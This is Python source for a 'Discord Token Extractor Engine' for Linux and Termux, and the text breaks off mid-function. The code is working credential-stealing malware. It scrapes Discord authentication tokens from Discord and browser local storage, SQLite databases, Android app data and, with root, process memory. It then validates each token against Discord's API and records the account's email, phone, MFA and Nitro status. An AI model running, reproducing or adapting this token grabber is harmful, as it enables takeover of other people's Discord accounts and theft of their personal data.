#!/usr/bin/env python3
"""
Discord Token Extractor Engine
Works on Termux (Android) and Linux
"""

import os
import re
import json
import base64
import sqlite3
import glob
import tempfile
import shutil
import subprocess
import requests
from datetime import datetime
from typing import Dict, List, Set, Tuple, Optional

class TokenValidator:
    """Validate and decode Discord tokens"""
    
    TOKEN_PATTERN = re.compile(
        r'([MN][A-Za-z0-9_-]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27})'
    )
    MFA_PATTERN = re.compile(
        r'(mfa\.[A-Za-z0-9_-]{84})'
    )
    
    @staticmethod
    def is_token(text: str) -> bool:
        """Check if string matches Discord token format"""
        if TokenValidator.TOKEN_PATTERN.fullmatch(text):
            return True
        if TokenValidator.MFA_PATTERN.fullmatch(text):
            return True
        return False
    
    @staticmethod
    def extract_tokens(text: str) -> Set[str]:
        """Extract all Discord tokens from text"""
        tokens = set()
        tokens.update(TokenValidator.TOKEN_PATTERN.findall(text))
        tokens.update(TokenValidator.MFA_PATTERN.findall(text))
        return tokens
    
    @staticmethod
    def decode_user_id(token: str) -> Optional[int]:
        """Decode user ID from token"""
        try:
            parts = token.split('.')
            if len(parts) >= 1:
                # Add padding for base64
                padded = parts[0] + '=='
                decoded = base64.b64decode(padded)
                user_id = int.from_bytes(decoded, 'big')
                return user_id
        except:
            pass
        return None
    
    @staticmethod
    def test_token(token: str, timeout: int = 5) -> dict:
        """Test token against Discord API"""
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        try:
            # Test with /users/@me
            r = requests.get(
                "https://discord.com/api/v9/users/@me",
                headers=headers,
                timeout=timeout
            )
            
            if r.status_code == 200:
                data = r.json()
                user_id = TokenValidator.decode_user_id(token)
                
                return {
                    "valid": True,
                    "token": token,
                    "user_id": data.get("id", str(user_id) if user_id else "Unknown"),
                    "username": data.get("username", "Unknown"),
                    "discriminator": data.get("discriminator", "0000"),
                    "global_name": data.get("global_name", ""),
                    "email": data.get("email", "Hidden"),
                    "phone": data.get("phone", "None"),
                    "verified": data.get("verified", False),
                    "mfa": data.get("mfa_enabled", False),
                    "nitro": data.get("premium_type", 0),
                    "bio": data.get("bio", ""),
                    "avatar": data.get("avatar", ""),
                    "banner": data.get("banner", ""),
                    "flags": data.get("flags", 0),
                    "public_flags": data.get("public_flags", 0),
                }
            
            elif r.status_code == 401:
                return {"valid": False, "token": token, "error": "Invalid/expired"}
            else:
                return {"valid": False, "token": token, "error": f"HTTP {r.status_code}"}
                
        except requests.exceptions.Timeout:
            return {"valid": False, "token": token, "error": "Timeout"}
        except Exception as e:
            return {"valid": False, "token": token, "error": str(e)}


class TokenExtractor:
    """Extract Discord tokens from various sources"""
    
    def __init__(self):
        self.found_tokens: Dict[str, str] = {}  # token -> source
        self.home = os.path.expanduser("~")
        self.is_termux = 'com.termux' in os.environ.get('PREFIX', '')
        self.is_root = os.geteuid() == 0
    
    def extract_from_leveldb(self) -> Dict[str, str]:
        """Extract tokens from Discord LevelDB files"""
        tokens = {}
        
        # Discord storage paths
        db_paths = [
            # Linux/Desktop
            f"{self.home}/.config/discord/Local Storage/leveldb/",
            f"{self.home}/.config/discordptb/Local Storage/leveldb/",
            f"{self.home}/.config/discordcanary/Local Storage/leveldb/",
            f"{self.home}/.config/discorddevelopment/Local Storage/leveldb/",
            # Browsers
            f"{self.home}/.config/google-chrome/Default/Local Storage/leveldb/",
            f"{self.home}/.config/google-chrome-beta/Default/Local Storage/leveldb/",
            f"{self.home}/.config/chromium/Default/Local Storage/leveldb/",
            f"{self.home}/.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb/",
            f"{self.home}/.config/microsoft-edge/Default/Local Storage/leveldb/",
            f"{self.home}/.config/opera/Local Storage/leveldb/",
            f"{self.home}/.config/vivaldi/Default/Local Storage/leveldb/",
            # Termux
            f"{self.home}/../usr/var/discord/Local Storage/leveldb/",
        ]
        
        # Also scan with glob for profile directories
        browser_profiles = glob.glob(f"{self.home}/.config/*/Profile */Local Storage/leveldb/")
        db_paths.extend(browser_profiles)
        
        for db_path in db_paths:
            if not os.path.exists(db_path):
                continue
            
            source_name = "LevelDB"
            for parts in db_path.split('/'):
                if parts in ["discord", "discordptb", "discordcanary"]:
                    source_name = parts
                elif parts in ["google-chrome", "chromium", "Brave-Browser"]:
                    source_name = f"Browser-{parts}"
            
            try:
                for file in os.listdir(db_path):
                    if not (file.endswith('.ldb') or file.endswith('.log')):
                        continue
                    
                    filepath = os.path.join(db_path, file)
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            # Extract strings and find tokens
                            strings = self._extract_strings(content)
                            for s in strings:
                                extracted = TokenValidator.extract_tokens(s)
                                for token in extracted:
                                    if token not in tokens:
                                        tokens[token] = source_name
                    except:
                        continue
            except:
                continue
        
        return tokens
    
    def extract_from_android_prefs(self) -> Dict[str, str]:
        """Extract from Android shared preferences (requires root)"""
        tokens = {}
        
        if not self.is_root:
            return tokens
        
        prefs_paths = [
            "/data/data/com.discord/shared_prefs/",
            "/data/data/com.discord/cache/",
            "/data/data/com.discord/files/",
        ]
        
        for base_path in prefs_paths:
            if not os.path.exists(base_path):
                continue
            
            try:
                for file in os.listdir(base_path):
                    if file.endswith('.xml') or file.endswith('.json'):
                        filepath = os.path.join(base_path, file)
                        try:
                            with open(filepath, 'r', errors='ignore') as f:
                                content = f.read()
                                extracted = TokenValidator.extract_tokens(content)
                                for token in extracted:
                                    if token not in tokens:
                                        tokens[token] = f"Android-{os.path.basename(base_path)}"
                        except:
                            continue
            except:
                continue
        
        return tokens
    
    def extract_from_databases(self) -> Dict[str, str]:
        """Extract tokens from SQLite databases"""
        tokens = {}
        
        db_paths = [
            f"{self.home}/.config/discord/databases/",
            f"{self.home}/.config/discordptb/databases/",
            f"{self.home}/.config/discordcanary/databases/",
        ]
        
        if self.is_root:
            db_paths.extend([
                "/data/data/com.discord/databases/",
                "/data/data/com.discord/app_discord/",
            ])
        
        for db_path in db_paths:
            if not os.path.exists(db_path):
                continue
            
            try:
                for file in os.listdir(db_path):
                    if not (file.endswith('.db') or file.endswith('.sqlite')):
                        continue
                    
                    filepath = os.path.join(db_path, file)
                    temp_db = tempfile.mktemp(suffix='.db')
                    
                    try:
                        shutil.copy2(filepath, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        # Get all tables
                        tables = cursor.execute(
                            "SELECT name FROM sqlite_master WHERE type='table'"
                        ).fetchall()
                        
                        for table in tables:
                            table_name = table[0]
                            try:
                                # Get all columns
                                columns = cursor.execute(
                                    f"PRAGMA table_info(\"{table_name}\")"
                                ).fetchall()
                                
                                for col in columns:
                                    col_name = col[1]
                                    # Check for token-related columns
                                    token_keywords = ['token', 'auth', 'key', 'secret', 
                                                     'session', 'access', 'refresh', 'jwt']
                                    
                                    if not any(kw in col_name.lower() for kw in token_keywords):
                                        continue
                                    
                                    rows = cursor.execute(
                                        f"SELECT \"{col_name}\" FROM \"{table_name}\""
                                    ).fetchall()
                                    
                                    for row in rows:
                                        if row[0] and isinstance(row[0], str):
                                            extracted = TokenValidator.extract_tokens(row[0])
                                            for token in extracted:
                                                if token not in tokens:
                                                    tokens[token] = f"Database-{file}"
                            except:
                                continue
                        
                        conn.close()
                    except:
                        pass
                    finally:
                        try:
                            os.remove(temp_db)
                        except:
                            pass
            except:
                continue
        
        return tokens
    
    def extract_from_memory(self) -> Dict[str, str]:
        """Extract tokens from Discord process memory (requires root)"""
        tokens = {}
        
        if not self.is_root:
            return tokens
        
        try:
            # Find Discord processes
            result = subprocess.run(
                ['pgrep', '-f', 'discord'],
                capture_output=True, text=True, timeout=5
            )
            
            pids = [int(p) for p in result.stdout.strip().split('\n') if p]
            
            for pid in pids:
                try:
                    maps_path = f"/proc/{pid}/maps"
                    mem_path = f"/proc/{pid}/mem"
                    
                    if not os.path.exists(maps_path):
                        continue
                    
                    with open(maps_path, 'r') as f:
                        maps = f.readlines()
                    
                    for line in maps:
                        parts = line.split()
                        if len(parts) < 2:
                            continue
                        
                        if 'r' not in parts[1]:
                            continue
                        
                        addr_range = parts[0]
                        try:
                            start, end = addr_range.split('-')
                            start = int(start, 16)
                            end = int(end, 16)
                            
                            # Read in chunks
                            with open(mem_path, 'rb') as mem:
                                mem.seek(start)
                                chunk_size = min(end - start, 65536)  # 64KB chunks
                                data = mem.read(chunk_size)
                                
                                extracted = TokenValidator.extract_tokens(
                                    data.decode('utf-8', errors='ignore')
                                )
                                
                                for token in extracted:
                                    if token not in tokens:
                                        tokens[token] = f"Memory-PID{pid}"
                        except:
                            continue
                except:
                    continue
                    
        except:
            pass
        
        return tokens
    
    def scan_discord_cache(self) -> Dict[str, str]:
        """Scan Discord cache directories"""
        tokens = {}
        
        cache_paths = [
            f"{self.home}/.cache/discord/",
            f"{self.home}/.cache/discordptb/",
            f"{self.home}/.cache/discordcanary/",
        ]
        
        if self.is_root:
            cache_paths.append("/data/data/com.discord/cache/")
        
        for cache_path in cache_paths:
            if not os.path.exists(cache_path):
                continue
            
            try:
                for root, dirs, files in os.walk(cache_path):
                    for file in files:
                        filepath = os.path.join(root, file)
                        try:
                            # Only read text files
                            if file.endswith(('.txt', '.json', '.log', '.dat')):
                                with open(filepath, 'r', errors='ignore') as f:
                                    content = f.read()
                                    extracted = TokenValidator.extract_tokens(content)
                                    for token in extracted:
                                        if token not in tokens:
                                            tokens[token] = "Cache"
                        except:
                            continue
            except:
                continue
        
        return tokens
    
    def _extract_strings(self, data: bytes, min_len: int = 30) -> List[str]:
        """Extract readable strings from binary data"""
        strings = []
        current = []
        
        for byte in data:
            if 32 <= byte <= 126:
                current.append(chr(byte))
            else:
                if len(''.join(current)) >= min_len:
                    strings.append(''.join(current))
                current = []
        
        if len(''.join(current)) >= min_len:
            strings.append(''.join(current))
        
        return strings
    
    def scan_all(self, config: dict) -> Dict[str, Tuple[str, str]]:
        """
        Run all extraction methods based on config
        Returns: {token: (source, source_detail)}
        """
        all_tokens = {}
        
        if config.get("SCAN_LEVELDB", True):
            print("[*] Scanning LevelDB...")
            tokens = self.extract_from_leveldb()
            for token, source in tokens.items():
                all_tokens[token] = (source, "Local Storage")
        
        if config.get("SCAN_ANDROID_PREFS", False) and self.is_root:
            print("[*] Scanning Android preferences...")
            tokens = self.extract_from_android_prefs()
            for token, source in tokens.items():
                all_tokens[token] = (source, "Android Prefs")
        
        if config.get("SCAN_MEMORY", False) and self.is_root:
            print("[*] Scanning process memory...")
            tokens = self.extract_from_memory()
            for token, source in tokens.items():
                all_tokens[token] = (source, "Memory")
        
        print("[*] Scanning databases...")
        tokens = self.extract_from_databases()
        for token, source in tokens.items():
            all_tokens[token] = (source, "Database")
        
        print("[*] Scanning cache...")
        tokens = self.scan_discord_cache()
        for token, source in tokens.items():
            all_tokens[token] = (source, "Cache")
        
        # Limit results
        max_tokens = config.get("MAX_TOKENS_PER_SCAN", 50)
        if len(all_tokens) > max_tokens:
            all_tokens = dict(list(all_tokens.items())[:max_tokens])
        
        return all_tokens


class TokenManager:
    """Manage collected tokens with validation"""
    
    def __init__(self):
        self.tokens: Dict[str, dict] = {}  # token -> info
        self.validated: Dict[str, dict] = {}  # token -> validation result
    
    def add_tokens(self, tokens: Dict[str, Tuple[str, str]]):
        """Add extracted tokens"""
        for token, (source, detail) in tokens.items():
            if token not in self.tokens:
                self.tokens[token] = {
                    "token": token,
                    "source": source,
                    "detail": detail,
                    "found_at": datetime.now().isoformat(),
                    "validated": False,
                    "valid": None,
                }
    
    def validate_all(self, token_limit: int = 20):
        """Validate all tokens against Discord API"""
        valid_tokens = []
        count = 0
        
        for token, info in self.tokens.items():
            if count >= token_limit:
                break
            
            if info["validated"]:
                if info["valid"]:
                    valid_tokens.append(info)
                continue
            
            result = TokenValidator.test_token(token)
            info["validated"] = True
            
            if result.get("valid"):
                info["valid"] = True
                info["username"] = result.get("username")
                info["discriminator"] = result.get("discriminator")
                info["email"] = result.get("email")
                info["mfa"] = result.get("mfa")
                info["user_id"] = result.get("user_id")
                info["nitro"] = result.get("nitro", 0) > 0
                valid_tokens.append(info)
            else:
                info["valid"] = False
                info["error"] = result.get("error", "Unknown")
            
            count += 1
        
        return valid_tokens
    
    def get_summary(self) -> dict:
        """Get summary of all tokens"""
        total = len(self.tokens)
        validated = sum(1 for t in self.tokens.values() if t["validated"])
  